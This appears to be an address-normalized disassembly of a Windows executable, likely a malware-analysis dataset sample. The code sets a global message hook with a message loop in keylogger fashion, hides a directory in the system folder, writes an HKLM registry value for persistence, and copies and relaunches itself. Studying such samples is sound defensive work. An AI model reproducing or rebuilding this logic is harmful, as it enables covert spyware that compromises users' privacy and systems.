sub_401000
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
call sub_4010b0
test eax eax
jne rwxdata
mov eax [ ebp + 0x8 ]
push 0x0
push eax
push rwxdata
push 0x0
call [ __import_lookup_table_3(USER32:SetWindowsHookExA) ]
mov esi [ __import_lookup_table_3(USER32:GetMessageA) ]
mov edi [ __import_lookup_table_3(USER32:TranslateMessage) ]
mov ebx [ __import_lookup_table_3(USER32:DispatchMessageA) ]
mov [ rwxdata ] eax
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea edx [ ebp - 0x2c ]
push edx
call edi
lea eax [ ebp - 0x2c ]
push eax
call ebx
jmp rwxdata
push 0x0
push 0x0
lea ecx [ ebp - 0x2c ]
push 0x0
push ecx
call esi
test eax eax
je rwxdata
sub_4010b0
push ecx
push esi
push edi
push 0x200
push rwxdata
call [ GetSystemDirectoryA@IAT ]
mov edi rwxdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov edx ecx
mov edi rwxdata
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rwxdata
and ecx 0x3
[ edi ] [ esi ]
call [ CreateDirectoryA@IAT ]
push rwxdata
call [ GetFileAttributesA@IAT ]
or al 0x2
push eax
push rwxdata
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
mov esi [ __import_lookup_table_0(KERNEL32:CreateEventA) ]
push rwxdata
push 0x0
push 0x0
push 0x0
call esi
push rwxdata
push 0x0
push 0x0
push 0x0
mov [ rwxdata ] eax
call esi
push rwxdata
push 0x0
push 0x0
push 0x0
mov [ rwxdata ] eax
call esi
push 0x0
mov [ rwxdata ] eax
call sub_4011a0
add esp 0x4
call sub_401340
mov esi [ __import_lookup_table_0(KERNEL32:CreateThread) ]
lea eax [ esp + 0x8 ]
push eax
push 0x0
push 0x0
push rwxdata
push 0x0
push 0x0
call esi
lea ecx [ esp + 0x8 ]
push ecx
push 0x0
push 0x0
push rwxdata
push 0x0
push 0x0
call esi
pop edi
mov eax 0x1
pop esi
pop ecx
retn
sub_4011a0
sub esp 0x288
push esi
xor esi esi
lea eax [ esp + 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rwxdata
push esi
push rwxdata
push 0x80000002
mov [ esp + 0x2c ] 0x80
call [ RegCreateKeyExA@IAT ]
mov eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push ecx
push edx
push esi
push esi
push rwxdata
push eax
call [ __import_lookup_table_1(ADVAPI32:RegQueryValueExA) ]
test eax eax
jne rwxdata
push edi
lea ecx [ esp + 0x90 ]
push 0x200
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x90 ]
push 0x5c
push edx
call [ strrchr@IAT ]
mov edx eax
add esp 0x8
inc edx
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rwxdata
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov cl [ edx ]
xor edi edi
test cl cl
je rwxdata
mov al [ esp + 0xc ]
test al al
je rwxdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push 0x1
push 0x0
push rwxdata
push eax
mov [ esp + edi + 0x28 ] 0x0
call [ __import_lookup_table_1(ADVAPI32:RegSetValueExA) ]
pop edi
lea esi [ esp + 0x10 ]
mov eax edx
sub esi edx
mov eax [ esp + 0x290 ]
mov [ esi + rwxdata ] 0x0
test eax eax
je rwxdata
dec al
mov [ esi + rwxdata ] al
mov al [ esp + esi + 0xd ]
inc esi
test al al
jne rwxdata
inc cl
inc edi
mov [ esi + eax ] cl
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne rwxdata
pop esi
add esp 0x288
retn
sub_4012c0
push ecx
lea eax [ esp ]
push 0x0
push eax
push 0x0
push 0x2001f
push 0x0
push rwxdata
push 0x0
push rwxdata
push 0x80000002
call [ RegCreateKeyExA@IAT ]
cmp [ esp + 0xc ] 0x1
jne rwxdata
mov edx [ esp + 0x8 ]
mov eax [ esp ]
push edx
push eax
call [ RegDeleteValueA@IAT ]
mov edx [ esp + 0x8 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ esp + 0x8 ]
push edx
push 0x1
push eax
push edx
push ecx
call [ __import_lookup_table_1(ADVAPI32:RegSetValueExA) ]
pop edi
jmp rwxdata
pop ecx
retn
push eax
call [ RegCloseKey@IAT ]
mov eax [ esp ]
test eax eax
je rwxdata
sub_401340
sub esp 0x600
push ebx
push esi
push edi
push rwxdata
push 0x0
push 0x1f0001
call [ OpenMutexA@IAT ]
mov ebx [ GetSystemDirectoryA@IAT ]
test eax eax
jne rwxdata
push ebp
push eax
call [ __import_lookup_table_0(KERNEL32:CloseHandle) ]
mov eax [ rwxdata ]
push eax
call [ SetEvent@IAT ]
mov ecx [ rwxdata ]
push 0x1388
push ecx
call [ __import_lookup_table_0(KERNEL32:WaitForSingleObject) ]
push 0x1f4
call [ Sleep@IAT ]
lea edx [ esp + 0x10 ]
push 0x200
push edx
call ebx
mov edi rwxdata
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rwxdata
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ __import_lookup_table_0(KERNEL32:DeleteFileA) ]
push 0x0
push rwxdata
call sub_4012c0
add esp 0x8
push rwxdata
push 0x0
push 0x0
call [ __import_lookup_table_0(KERNEL32:CreateMutexA) ]
pop ebp
push rwxdata
push 0x0
push 0x0
call [ __import_lookup_table_0(KERNEL32:CreateMutexA) ]
jmp rwxdata
push 0x1
push rwxdata
call sub_4012c0
push 0x1
call sub_4011a0
add esp 0x60c
retn
lea edx [ esp ]
push 0x0
lea eax [ esp + 0x204 ]
push edx
push eax
call [ CopyFileA@IAT ]
lea ecx [ esp ]
push ecx
call sub_401790
add esp 0x4
push 0x1
call [ ExitProcess@IAT ]
lea ecx [ esp + 0x20c ]
push 0x400
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0xc ]
push 0x200
push edx
mov [ esp + eax + 0x214 ] 0x0
call ebx
mov edi rwxdata
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0xc ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rwxdata
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xc ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x210 ]
push ecx
call [ __import_lookup_table_0(KERNEL32:lstrcmpiA) ]
pop edi
pop esi
test eax eax
pop ebx
je rwxdata
sub_401790
sub esp 0x54
push edi
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
mov [ esp + 0x44 ] ax
lea eax [ esp + 0x4 ]
mov edx [ esp + 0x5c ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
push 0x0
mov [ esp + 0x68 ] 0x1
call [ CreateProcessA@IAT ]
pop edi
add esp 0x54
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __import_lookup_table_2(MSVCRT:__set_app_type) ]
pop ecx
or [ rwxdata ] 0xffffffff
or [ rwxdata ] 0xffffffff
call [ __import_lookup_table_2(MSVCRT:__p__fmode) ]
mov ecx [ rwxdata ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rwxdata ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rwxdata ] eax
call sub_401a5f
cmp [ rwxdata ] ebx
jne rwxdata
call sub_401a4a
push rwxdata
push rwxdata
call _initterm
mov eax [ rwxdata ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rwxdata ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rwxdata
push rwxdata
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne rwxdata
push rwxdata
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je rwxdata
mov al [ esi ]
cmp al bl
je rwxdata
inc esi
mov [ ebp - 0x74 ] esi
jmp rwxdata
cmp [ esi ] 0x22
jne rwxdata
cmp al 0x22
jne rwxdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ __import_lookup_table_0(KERNEL32:GetStartupInfoA) ]
test [ ebp - 0x30 ] 0x1
je rwxdata
cmp al 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp rwxdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ __import_lookup_table_2(MSVCRT:exit) ]
_XcptFilter
jmp [ __import_lookup_table_2(MSVCRT:_XcptFilter) ]
_initterm
jmp [ _initterm@IAT ]
sub_401a4a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401a5f
retn
_controlfp
jmp [ __import_lookup_table_2(MSVCRT:_controlfp) ]
